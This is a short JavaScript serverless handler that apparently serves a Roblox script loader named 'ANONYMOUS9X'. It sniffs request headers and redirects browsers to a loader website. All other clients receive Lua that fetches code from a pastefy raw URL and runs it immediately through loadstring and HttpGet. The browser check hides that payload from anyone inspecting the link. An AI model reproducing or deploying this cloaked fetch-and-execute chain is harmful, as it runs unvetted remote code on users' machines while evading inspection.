export default function handler(req, res) {

const userAgent =
req.headers['user-agent'] || ''

const acceptHeader =
req.headers['accept'] || ''

res.setHeader(
'Content-Type',
'text/plain'
)

res.setHeader(
'Access-Control-Allow-Origin',
'*'
)

const isBrowser =

acceptHeader.includes('text/html') ||

userAgent.includes('Chrome') ||

userAgent.includes('Firefox') ||

userAgent.includes('Safari')

if (isBrowser) {

res.setHeader(
'Location',
'https://anonymous9xloader.vercel.app/'
)

res.status(302).send(`

<!DOCTYPE html>

<html>

<head>

<meta http-equiv="refresh"
content="0; url=https://anonymous9xloader.vercel.app/">

<script>

window.location.href =
"https://anonymous9xloader.vercel.app/"

</script>

</head>

<body>

Redirecting...

</body>

</html>

`)

return
}

const luaCode = `

print("═══════════════════════")
print(" ANONYMOUS9X SYSTEM ")
print("═══════════════════════")

loadstring(game:HttpGet(
"https://pastefy.app/FmPzlwV5/raw"
))()

`

res.status(200).send(luaCode)
}
